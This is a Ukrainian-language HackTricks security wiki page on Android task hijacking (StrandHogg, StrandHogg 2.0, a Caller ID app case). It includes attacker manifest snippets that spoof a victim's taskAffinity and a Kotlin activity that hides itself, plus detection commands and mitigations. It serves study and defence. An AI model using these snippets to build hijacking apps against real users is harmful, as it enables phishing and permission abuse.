# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Завдання, стек назад та активності на передньому плані

В Android, **завдання** - це, по суті, набір активностей, з якими користувачі взаємодіють для виконання конкретної роботи, організованих у **стек назад**. Цей стек упорядковує активності на основі того, коли вони були відкриті, причому найновіша активність відображається вгорі як **активність на передньому плані**. У будь-який момент часу лише ця активність видима на екрані, що робить її частиною **завдання на передньому плані**.

Ось швидкий огляд переходів між активностями:

- **Активність 1** починається як єдина активність на передньому плані.
- Запуск **Активності 2** переміщує **Активність 1** у стек назад, виводячи **Активність 2** на передній план.
- Запуск **Активності 3** переміщує **Активність 1** та **Активність 2** далі назад у стеку, з **Активністю 3** тепер попереду.
- Закриття **Активності 3** повертає **Активність 2** на передній план, демонструючи спрощений механізм навігації завданнями в Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Атаки на афінність завдання

`taskAffinity` вказує Android, до якого завдання `Activity` *бажає* належати. Коли дві активності мають однакову афінність, **Android дозволяє об'єднувати їх у одному стеку назад, навіть якщо вони походять з різних APK**.

Якщо зловмисник може розмістити шкідливу активність на **корені** цього стеку, щоразу, коли жертва відкриває легітимний додаток, шкідливий інтерфейс буде першим, що побачить користувач – ідеально для фішингу або зловживання дозволами.

Поверхня атаки ширша, ніж багато розробників вважають, оскільки **кожна активність автоматично успадковує афінність, рівну назві пакета програми** (якщо розробник не встановить `android:taskAffinity=""`). Тому *нічого не роблячи* вже залишає додаток відкритим для захоплення завдань на версіях Android до 11.

### Класичний сценарій "singleTask / StrandHogg"

1. Зловмисник оголошує активність з:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. Шкідливий додаток запускається один раз, щоб завдання (з підробленою афінністю) існувало в останніх завданнях.
3. Коли користувач пізніше відкриває реальний додаток, Android виявляє, що вже існує завдання, афінність якого **відповідає пакету**, і просто виводить це завдання на передній план.
4. Інтерфейс зловмисника показується першим.

### Вариант за замовчуванням – випадок Caller ID

Вразливість, виявлена в додатку **Caller ID (caller.id.phone.number.block)**, показує, що атака *також* працює проти стандартного режиму запуску `standard`:

1. Зловмисний додаток створює фальшиву кореневу активність і відразу ж ховається:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // зберегти завдання в останніх, але поза полем зору
}
}
```
2. У маніфесті потрібно лише скопіювати пакет жертви в `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Як тільки користувач встановлює і відкриває шкідливий додаток **один раз**, завдання, афінність якого дорівнює пакету жертви, існує (але знаходиться на фоні).
4. Коли запускається реальний додаток Caller ID, Android повторно використовує це завдання і виводить `HackActivity` на передній план → вікно фішингу/зловживання дозволами.

> ПРИМІТКА: Починаючи з **Android 11 (API 30)**, система *не* поміщає два пакети, які не є частиною одного UID, в одне завдання за замовчуванням, що пом'якшує цей конкретний варіант. Старі версії залишаються вразливими.

---

### StrandHogg 2.0 (CVE-2020-0096) – Захоплення завдання на основі рефлексії

Безпековий бюлетень Google за травень 2020 року виправив більш просунутий варіант, названий **StrandHogg 2.0**. Експлуатація **не покладається на `taskAffinity` взагалі**; натомість вона використовує *рефлексію*, щоб динамічно вставити активність зловмисника на верхівку *кожного* запущеного завдання, повністю обходячи обмеження "спільного UID", введене Android 11.

Ключові моменти:

* Шкідливий додаток без дозволів може, після відкриття, перебрати запущені завдання і викликати приховані API, щоб **перенести** свою активність у будь-яке завдання.
* Оскільки активність вставляється після часу виконання, ні `launchMode`, ні статичний аналіз маніфесту не можуть виявити атаку заздалегідь.
* Виправлено шляхом перенесення перевірки в **Android 8.0/8.1/9** (травень 2020 SPL). **Android 10 і новіші версії не підлягають впливу.**

Виявлення на пристроях до виправлення може бути виконано за допомогою `adb shell dumpsys activity activities` і спостереження за підозрілими активностями, назва пакета яких відрізняється від *афінності* завдання.

Пом'якшення для старих пристроїв таке ж, як і класичне захоплення завдань **плюс** перевірка під час виконання (наприклад, виклик [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) і перевірка назви вашого пакета).

---

## Перелік виявлення та експлуатації

1. **Статичний огляд** – Витягніть `AndroidManifest.xml` з цільового APK і перевірте, що кожна `<activity>` (або глобальний елемент `<application>`) містить `android:taskAffinity=""` (порожній) **або** налаштоване значення. Інструменти, такі як:
```bash
# Використовуючи apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# Використовуючи AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **Динамічний огляд** – На пристрої відкрийте цільовий додаток і перелікуйте завдання:
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
Завдання, афінність кореня якого дорівнює пакету жертви, але верхня активність належить до *іншого* пакету, є червоним прапором.
3. Створіть шкідливий додаток, як описано вище, або використовуйте **[Drozer](https://github.com/WithSecureLabs/drozer)**:
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## Пом'якшення

Розробники повинні:

* Явно встановити `android:taskAffinity=""` на рівні `<application>` (рекомендується) **або** надати кожній активності унікальну, приватну афінність.
* Для дуже чутливих екранів поєднати вищезазначене з `android:launchMode="singleInstance"` або сучасними [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode) захистами.
* Оновити `targetSdkVersion` додатка та впровадити зміни поведінки **Android 11**, де завдання за замовчуванням не діляться між пакетами.
* Націлити **Android 12 (API 31) або вище**, щоб обов'язковий атрибут `android:exported` змусив розробників перевіряти кожен компонент, доступний ззовні.
* Розглянути самозахист під час виконання: періодично запитувати `ActivityTaskManager`, щоб переконатися, що пакет вашої верхньої активності відповідає вашому власному.

---

## Пов'язані техніки захоплення UI

Захоплення завдань часто поєднується з або замінюється **tapjacking** (обман UI на основі накладок). Дослідження **TapTrap** 2025 року показало, що повністю прозорі *анімовані* активності можуть обійти обмеження на накладення дотиків, введені в Android 12–14, і все ще обманювати користувачів, змушуючи їх надавати небезпечні дозволи. Хоча TapTrap не є строго *захопленням* завдань, кінцева мета (фішингові кліки) ідентична – тому сучасні оцінки повинні перевіряти обидві поверхні атаки.

---

## Посилання

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) technical write-up](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap: Animation-Driven Tapjacking on Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
